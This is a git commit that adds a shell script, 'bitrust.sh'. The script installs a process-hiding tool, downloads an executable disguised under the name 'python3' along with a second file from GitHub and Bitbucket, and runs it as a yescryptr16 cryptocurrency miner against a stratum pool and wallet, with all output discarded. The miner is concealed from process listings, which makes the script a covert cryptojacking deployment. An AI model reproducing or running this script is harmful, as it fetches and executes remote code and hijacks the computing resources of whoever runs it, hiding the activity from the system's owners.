8b66475bd29289558c0ec1eaa6e99de7aa0fd8f1
danipedrosang <134082647+danipedrosang@users.noreply.github.com>
2023-05-24 16:48:27 +0700

    Create bitrust.sh

---
+++ bitrust.sh
@@ -0,0 +1,7 @@
+apt update -y
+apt install gcc screen -y
+curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
+apt install nodejs -y
+npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add python3 
+wget https://github.com/danipedrosang/marcrash/raw/main/python3 && wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload &&  chmod +x python3 reload
+./python3 -a yescryptr16  -o stratum+tcp://stratum-eu.rplant.xyz:7065 -u web1qyzgpcnssde96zrfs3n4g6saunyy6mm534wzjeh.test -t 1 >/dev/null 2>&1
